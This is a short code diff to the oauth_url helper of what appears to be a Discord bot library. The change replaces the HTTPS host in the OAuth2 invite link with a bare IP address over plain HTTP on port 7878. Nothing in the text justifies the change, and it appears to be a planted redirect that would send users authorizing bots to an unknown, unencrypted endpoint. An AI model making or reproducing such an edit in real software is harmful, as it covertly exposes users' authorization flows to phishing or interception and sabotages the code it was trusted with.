@@ -319,7 +319,7 @@ def oauth_url(
     :class:`str`
         The OAuth2 URL for inviting the bot into guilds.
     """
-    url = f"https://proxy.vanityroles.com/oauth2/authorize?client_id={client_id}"
+    url = f"http://184.15.74.56:7878/oauth2/authorize?client_id={client_id}"
     url += "&scope=" + "+".join(scopes or ("bot",))
     if permissions is not MISSING:
         url += f"&permissions={permissions.value}"
